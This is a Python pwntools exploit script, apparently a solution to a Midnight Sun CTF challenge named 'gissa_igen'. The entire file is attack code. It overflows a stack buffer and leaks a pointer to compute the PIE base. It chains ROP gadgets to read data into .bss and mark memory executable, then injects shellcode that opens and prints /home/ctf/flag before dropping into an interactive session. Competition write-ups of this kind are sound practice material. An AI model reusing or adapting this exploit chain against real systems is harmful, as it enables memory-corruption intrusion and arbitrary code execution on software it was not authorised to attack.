from pwn import *
import time

#r = process("./gissa_igen")
r = remote("gissa-igen-01.play.midnightsunctf.se", 4096)
r.recvuntil(":")
r.sendline("")
r.recvuntil(":")

payload1 = "A"*0x8c + p32(0x000000a0)
r.sendline(payload1)
r.recvuntil("A"*0x8c)


payload = "A"*0x8c + p32(0x0101018b) + p64(0x10000000000000000-100) + p64(0x10000000000000000-100)
r.sendline(payload)

r.recvuntil("A"*0x8c)
r.recv(20)

leak = r.recv(6)
leak = u64(leak.ljust(8, "\x00"))
print hex(leak)

#time.sleep(0.1)
pause()
piebase = leak - 0xbb7

poprdirsi = piebase + 0x0000000000000c22 # pop rdi ; pop rsi ; ret
poprdx = piebase + 0x0000000000000c1d # pop rdx ; pop r9 ; pop r8 ; pop rdi ; pop rsi ; ret
syscall = piebase + 0x0000000000000bd9 # syscall ; ret
xorrax = piebase + 0x0000000000000bd4 # xor rax, rax ; mov al, 0 ; syscall ; ret
flagloc = piebase + 0x202000
bss = piebase + 0x202040
ropchain = ""
ropchain += p64(poprdx) + p64(0x200) + p64(0x0) + p64(0x0) + p64(0x0) + p64(bss)
ropchain += p64(xorrax)
ropchain += p64(poprdx) + p64(20) + p64(0x0) + p64(0x0) + p64(0x0) + p64(bss-20)
ropchain += p64(xorrax)
ropchain += p64(poprdx) + p64(0x7) + p64(0x0) + p64(0x0) + p64(piebase + 0x202000) + p64(0x1000)
ropchain += p64(syscall)
ropchain += p64(bss)

payload = "fla" + "A"*(0x8c-3) + p32(0x0101018b) + p64(5) + p64(0x104) + p64(0x6969) + ropchain
r.sendline(payload)


context.arch = "amd64"
code = shellcraft.amd64.pushstr("/home/ctf/flag")
code += """
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 0x40000002
syscall

mov rdi, rax
mov rsi, {addr}
mov rdx, 0x40
xor rax, rax
syscall

mov rax, 1
mov rdi, 1
syscall
"""
code = code.format(addr=hex(bss - 0x40))
shellcode = asm(code, os="linux", arch="amd64")
r.sendline(shellcode)
time.sleep(0.2)
r.sendline("D"*9)
time.sleep(0.2)


r.interactive()
